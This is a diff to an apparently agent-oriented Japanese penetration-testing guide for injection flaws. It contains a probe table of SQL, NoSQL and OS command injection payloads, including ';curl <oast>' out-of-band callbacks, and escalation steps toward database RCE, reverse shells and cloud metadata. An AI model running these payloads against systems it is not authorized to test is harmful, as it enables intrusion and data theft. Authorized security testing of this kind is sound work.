@@ -41,7 +41,7 @@ tags:
 |---|---|---|
 | SQLi (in-band) | `'`, `"`, `\\` | SQL error, syntax error, length 差 |
 | SQLi (boolean) | `' AND 1=1-- ` vs `' AND 1=2-- ` | response 差分 |
-| SQLi (time) | `' AND SLEEP(5)-- ` (MySQL) / `;WAITFOR DELAY '0:0:5'--` (MSSQL) | 5 秒遅延 |
+| SQLi (time) | `' AND SLEEP(5)-- ` (MySQL) / `;WAITFOR DELAY '0:0:5'--` (MSSQL) — engine 別 payload は `references/sql-manual.md` Phase 1 | 5 秒遅延 |
 | NoSQLi | `{"$ne":""}` / `{"$gt":""}` (Mongo)、`'` (CouchDB) | 認証通過 / count 異常 |
 | OS command | `;id`, `|id`, `&&id`, `` `id` ``、`$(id)` | uid 含む応答 |
 | Blind OS cmd | `;curl <oast>`、`;dig <oast>` | OAST hit |
@@ -100,7 +100,7 @@ filter 構造 `(&(uid=USER)(pass=PASS))` に `*)(uid=*` を入れて常時マッ
 
 ### Phase 4 — エスカレーション
 
-- DB なら schema → users → password hash → secondary RCE 経路 (`xp_cmdshell` / `INTO OUTFILE` / pg_read_server_files)
+- DB なら schema → users → password hash → secondary RCE 経路 (`xp_cmdshell` (MSSQL) / `INTO OUTFILE` (MySQL) / `pg_read_server_files` (PG) / `ATTACH DATABASE ... AS x` `load_extension(...)` (SQLite、 既定無効・有効化されていれば DLL/so 読込))
 - OS command なら shell upgrade → reverse shell
 - SSTI なら eval → reverse shell
 - XXE なら file read → SSRF → metadata
@@ -128,6 +128,11 @@ xxe-injector / xxefilter
 ffuf
 WebFetch / WebSearch
 Bash (sandbox)
+
+# curl + python3 のみの最低限環境向け fallback:
+#   sqlmap 不在        → 手動で UNION / boolean / time / error-based を組立 (references/sql-manual.md)
+#   commix / tplmap 不在 → Phase 2 のプローブ表を curl で投げて baseline 差分
+#   payload encoding   → python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "<payload>"
 ```
 
 ## Related Skills
